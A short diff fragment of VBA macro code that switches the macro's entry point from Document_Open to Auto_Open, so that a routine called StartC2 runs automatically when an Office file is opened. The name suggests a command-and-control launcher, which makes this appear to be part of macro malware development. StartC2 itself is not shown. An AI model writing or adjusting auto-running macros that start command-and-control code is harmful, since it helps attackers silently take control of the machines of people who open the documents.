@@ -71,7 +71,7 @@ error:
 
 End Function
 
-Sub Document_Open()
+Sub Auto_Open()
     Dim strOutput As String
 
     StartC2
